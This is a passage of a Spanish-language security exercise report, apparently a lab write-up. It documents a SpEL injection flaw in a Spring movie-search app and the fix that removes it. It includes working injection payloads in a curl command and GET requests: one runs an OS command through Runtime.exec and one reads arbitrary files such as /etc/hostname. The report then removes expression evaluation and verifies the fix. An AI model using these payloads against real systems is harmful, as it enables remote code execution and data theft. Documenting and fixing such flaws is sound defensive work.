@@ -315,3 +315,87 @@ ls -l /tmp/ej3_PWNED_write.txt      # <-- el archivo aparece FUERA de uploadDir
 | PNG válido (`whatever.php.png`) | OK, nombre del cliente | OK, guardado como `<uuid>.png`, servido `image/png` + `nosniff` |
 | `GET /uploads/..%2f..%2fapplication.properties` | (Tomcat ya devolvía 400) | 400/404, además con contención propia |
 
+---
+
+## Ejercicio 4 — Server-Side Template Injection / SpEL Injection → RCE (CWE-94 / CWE-917)
+
+### 4.1 Hallazgo
+
+Archivo: `Ejercicio4/src/main/java/com/cinebuscador/config/SpelEvaluator.java`.
+
+```java
+ExpressionParser parser = new SpelExpressionParser();
+EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build(); // <- se crea y NO se usa
+StandardEvaluationContext standardContext = new StandardEvaluationContext();
+standardContext.setVariable("system", System.class);
+standardContext.setVariable("runtime", Runtime.class);
+var expr = parser.parseExpression(expression);         // 'expression' = parametro ?buscar
+Object result = expr.getValue(standardContext);        // evaluacion con contexto de PLENO poder
+```
+
+`FuncionController.search()` pasa el parámetro `buscar` (controlado por el usuario)
+directamente a `spelEval.evaluate()`. Se **parsea y evalúa como expresión SpEL**
+con un `StandardEvaluationContext`, que permite invocar cualquier tipo/método de
+Java (`T(...)`, constructores, reflexión). El `SimpleEvaluationContext` seguro se
+instancia pero nunca se usa. Resultado: **ejecución remota de código**.
+
+### 4.2 PoC
+
+Requisitos: `cd Ejercicio4 && mvn spring-boot:run` (o `docker compose up`),
+app en `http://127.0.0.1:8080`.
+
+**PoC 1 — RCE (ejecutar comandos del SO)**
+
+```
+GET /?buscar=T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id > /tmp/ej4_rce_proof.txt'})
+```
+
+`curl`:
+
+```bash
+curl -G http://127.0.0.1:8080/ \
+  --data-urlencode "buscar=T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id > /tmp/ej4_rce_proof.txt'})"
+cat /tmp/ej4_rce_proof.txt
+```
+
+Salida observada (antes del fix): el mensaje de la página muestra
+`Process[pid=..., exitValue="not exited"]` y el archivo `/tmp/ej4_rce_proof.txt`
+queda creado por el proceso del servidor con el resultado real de `id`
+(`uid=501(bruno) gid=20(staff) ...`).
+
+**PoC 2 — Lectura de archivos arbitrarios**
+
+```
+GET /?buscar=new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/hostname')))
+```
+
+El contenido del archivo aparece reflejado en el mensaje "Resultados buscando por: ...".
+
+### 4.3 Mitigación
+
+- Se **elimina por completo** la evaluación de expresiones: `SpelEvaluator.java`
+  se borra y se quita la dependencia directa `spring-expression` del `pom.xml`.
+- `FuncionController.search()` usa el término de búsqueda como **dato literal**:
+  `String.contains()` insensible a mayúsculas sobre `nombre_funcion`. La entrada
+  del usuario nunca se interpreta como expresión, plantilla ni código.
+- Se actualiza el texto de `index.html` (ya no describe una vulnerabilidad SSTI).
+  La salida sigue pasando por el autoescape de Thymeleaf.
+
+```java
+String termino = buscar.trim().toLowerCase();
+List<Funcion> resultados = funcionRepo.findAll().stream()
+    .filter(f -> f.getNombreFuncion() != null &&
+                 f.getNombreFuncion().toLowerCase().contains(termino))
+    .collect(Collectors.toList());
+```
+
+### 4.4 Verificación
+
+| Caso | Antes | Después |
+|------|-------|---------|
+| `buscar=Inception` / `Matrix` | Error/0 resultados (no era buscador real) | Filtra las funciones correctas |
+| PoC 1 `T(java.lang.Runtime)...exec(...)` | Ejecuta el comando; crea `/tmp/ej4_rce_proof.txt` | "No se encontraron coincidencias."; no se ejecuta nada |
+| PoC 2 `Files.readAllBytes('/etc/hostname')` | Devuelve el contenido del archivo | Tratado como texto literal, sin coincidencias |
+| `buscar=<b>x</b>&y` | — | Se muestra escapado (`&lt;b&gt;`), sin XSS |
+| Log del servidor | `Process[...]` / SpEL | Sin `SpelEvaluationException` ni ejecución |
+
